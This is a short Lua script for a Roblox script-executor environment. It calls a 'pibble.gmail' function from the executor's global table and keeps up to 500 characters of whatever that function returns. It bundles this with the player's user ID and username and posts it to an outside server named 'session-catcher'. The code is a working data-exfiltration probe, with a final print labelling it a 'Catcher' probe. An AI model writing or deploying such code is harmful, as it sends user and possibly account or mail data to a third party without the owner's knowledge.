local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local pibbleResults = {}

-- Только pibble, по одной функции, каждая в pcall

pcall(function()
    local genv = getgenv()
    local pbl = genv and genv.pibble
    if not pbl then
        pibbleResults["error"] = "pibble table not found"
        return
    end
    
    -- Только gmail
    local ok, res = pcall(pbl.gmail)
    pibbleResults["gmail"] = ok and tostring(res):sub(1, 500) or "ERR: " .. tostring(res):sub(1, 200)
end)

local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    pibbleResults = pibbleResults,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] pibble.gmail probe sent")
